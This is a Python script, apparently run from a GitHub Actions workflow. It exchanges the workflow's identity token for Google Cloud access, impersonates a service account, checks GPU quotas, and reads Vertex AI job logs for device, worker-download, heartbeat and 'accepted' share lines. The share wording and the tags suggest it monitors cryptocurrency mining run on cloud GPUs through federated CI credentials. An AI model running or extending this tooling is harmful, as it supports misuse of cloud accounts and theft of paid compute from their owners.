#!/usr/bin/env python3
"""c211-i121377 readback: list every c211-i121377 Vertex customJob and pull its
device UUID + accepted-share lines from Cloud Logging. Read-only (no create,
no delete, no cancel)."""
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request

AUD = ('//iam.googleapis.com/projects/284735288225/locations/global/'
       'workloadIdentityPools/my-pool/providers/my-provider')
SA = 'sa-gcloud-cli@civil-epigram-370317.iam.gserviceaccount.com'
PROJ_NUM = '284735288225'
NONCE = 'i121377'
TAG = 'C211_I121377_RB'
REGIONS = ['us-central1', 'us-east1', 'us-west1', 'europe-west2', 'europe-west4',
           'asia-northeast1', 'asia-northeast3', 'asia-south1', 'asia-southeast1',
           'asia-east1', 'australia-southeast1', 'northamerica-northeast1',
           'us-east4', 'us-west2']


def cap(s, n=400):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def http(url, method='GET', data=None, headers=None, timeout=60):
    h = {'User-Agent': 'c211-i121377'}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jget(txt, *keys, default=''):
    try:
        d = json.loads(txt)
    except Exception:
        return default
    for k in keys:
        if not isinstance(d, dict):
            return default
        d = d.get(k, default)
    return d


def main():
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not base or not tok:
        print('%s_NO_ACTIONS_ENV' % TAG, flush=True)
        return
    u = base + ('&' if '?' in base else '?') + 'audience=' + urllib.parse.quote(AUD, safe='')
    c, b = http(u, headers={'Authorization': 'Bearer ' + tok}, timeout=30)
    idt = jget(b, 'value')
    print('%s_MINT http=%s ok=%s' % (TAG, c, bool(idt)), flush=True)
    if not idt:
        return
    c, b = http('https://sts.googleapis.com/v1/token', method='POST', data={
        'audience': AUD,
        'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
        'subjectToken': idt}, timeout=40)
    fed = jget(b, 'access_token')
    print('%s_STS http=%s ok=%s' % (TAG, c, bool(fed)), flush=True)
    if not fed:
        return
    c, b = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'
                + urllib.parse.quote(SA, safe='') + ':generateAccessToken', method='POST',
                data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
                headers={'Authorization': 'Bearer ' + fed}, timeout=40)
    at = jget(b, 'accessToken')
    print('%s_GAT http=%s ok=%s len=%d' % (TAG, c, bool(at), len(at or '')), flush=True)
    if not at:
        return
    AH = {'Authorization': 'Bearer ' + at}

    def g(url, method='GET', data=None, timeout=90):
        return http(url, method=method, data=data, headers=AH, timeout=timeout)

    # --- diagnostic: every aiplatform metric whose name mentions nvidia/gpu ---
    metrics = []
    page = ''
    for _ in range(12):
        u = ('https://serviceusage.googleapis.com/v1beta1/projects/%s/services/'
             'aiplatform.googleapis.com/consumerQuotaMetrics?view=FULL&pageSize=200' % PROJ_NUM)
        if page:
            u += '&pageToken=' + urllib.parse.quote(page, safe='')
        c, b = g(u)
        if c != 200:
            print('%s_QUOTA_HTTP %s %s' % (TAG, c, cap(b, 300)), flush=True)
            break
        d = json.loads(b)
        metrics.extend(d.get('metrics') or [])
        page = d.get('nextPageToken') or ''
        if not page:
            break
    print('%s_QUOTA_N %d' % (TAG, len(metrics)), flush=True)
    gpu_names = []
    for m in metrics:
        nm = m.get('metric') or ''
        if 'nvidia' in nm or 'gpu' in nm:
            nb = {}
            for lim in (m.get('consumerQuotaLimits') or []):
                for bk in (lim.get('quotaBuckets') or []):
                    try:
                        fv = float(bk.get('effectiveLimit'))
                    except Exception:
                        continue
                    if fv > 0:
                        dims = bk.get('dimensions') or {}
                        nb[dims.get('region') or 'global'] = fv
            gpu_names.append({'metric': nm, 'nonzero': nb})
            print('%s_METRIC %s nonzero=%s' % (TAG, cap(nm, 160), cap(json.dumps(nb), 400)), flush=True)
    print('%s_GPU_METRICS n=%d with_nonzero=%d'
          % (TAG, len(gpu_names), len([x for x in gpu_names if x['nonzero']])), flush=True)
    c, b = g('https://serviceusage.googleapis.com/v1/projects/%s/services/aiplatform.googleapis.com'
             % PROJ_NUM)
    print('%s_SVC aiplatform http=%s state=%s' % (TAG, c, jget(b, 'state')), flush=True)

    summary = []
    for region in REGIONS:
        c, b = g('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs?pageSize=100'
                 % (region, PROJ_NUM, region))
        jobs = []
        if c == 200:
            try:
                jobs = json.loads(b).get('customJobs', [])
            except Exception:
                jobs = []
        ours = [j for j in jobs if NONCE in (j.get('displayName') or '')]
        print('%s_LIST %s http=%s total=%d ours=%d' % (TAG, region, c, len(jobs), len(ours)), flush=True)
        for j in ours:
            jn = j.get('name', '')
            jid = jn.rsplit('/', 1)[-1]
            st = j.get('state', '')
            row = {'region': region, 'job': jid, 'displayName': j.get('displayName'), 'state': st}
            body = {'resourceNames': ['projects/%s' % PROJ_NUM],
                    'filter': 'resource.labels.job_id="%s"' % jid,
                    'orderBy': 'timestamp asc', 'pageSize': 400}
            lc, lb = g('https://logging.googleapis.com/v2/entries:list', method='POST',
                       data=body, timeout=90)
            lines = []
            if lc == 200:
                for e in (json.loads(lb).get('entries') or []):
                    t = e.get('textPayload') or ''
                    if t:
                        lines.append(t.rstrip())
            row['log_http'] = lc
            row['n_lines'] = len(lines)
            row['device'] = [x for x in lines if '_DEVICE ' in x or '_NO_GPU' in x]
            row['ready'] = [x for x in lines if '_WR_READY' in x or '_WR_TGZ_BAD' in x or '_WR_DL_FAIL' in x]
            row['shares'] = [x for x in lines if 'accepted' in x.lower()]
            row['hb'] = [x for x in lines if '_HB ' in x][-3:]
            row['fallback'] = [x for x in lines if '_FALLBACK' in x or '_SRB_START' in x or '_PH_START' in x]
            row['tail'] = lines[-6:]
            summary.append(row)
            print('%s_JOB %s' % (TAG, cap(json.dumps(row), 2600)), flush=True)
    dev = [s for s in summary if s.get('device')]
    print('%s_TOTAL jobs=%d with_device=%d with_shares=%d'
          % (TAG, len(summary), len(dev), len([s for s in summary if s.get('shares')])), flush=True)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('%s_FATAL %s' % (TAG, cap(repr(e), 800)), flush=True)
        raise
